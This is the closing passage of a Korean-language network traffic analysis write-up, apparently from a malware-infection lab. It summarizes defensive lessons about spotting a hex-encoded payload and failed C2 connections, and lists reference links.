6. **인코딩된 페이로드는 EXE 검색을 피해 가요.** `text/plain`으로 표시된 349 KB hex 글자가 페이로드였어요. MIME 형식이 아니라 크기와 앞뒤 상황으로 판단해요.
7. **실패한 연결도 증거예요.** 페이로드 직후, 하드코딩된 IP로, 일정한 박자로, 바이트 없이 `REJ`와 `S0` — 깨끗한 PC가 아니라 C2가 죽어 있는 감염이에요.
8. **트래픽으로 볼 수 없는 것과 그걸 찾을 곳을 적어요.** `.js`와 `.exe` 내용·해시, 지속성, 진짜 악성코드 계열은 모두 호스트에서 나와요.

## 참고 자료 { #references }

- [Night Dew 두 번째 분석 — pcapbox, Arkime + Splunk, Snort 테스트 가이드](night-dew-arkime-splunk-netlogon-bruteforce.md)
- [피싱 메일이라는 함정, 실제 원인은 익스플로잇 킷 — 해킹된 사이트에서 시작하는 또 다른 사슬](phishing-red-herring-ek-driveby-ursnif-c2.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md)
- [Zeek 로그](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md) · [ssl & x509](../../network/zeek/ssl-x509.md)
- [비콘과 C2](../../network/beaconing-c2.md) · [플레이북: 침해된 워크스테이션](../playbooks/compromised-workstation.md)
- 원래 실습: [malware-traffic-analysis.net — 2018-06-30 Sorting through the alerts](https://malware-traffic-analysis.net/2018/06/30/index.html)
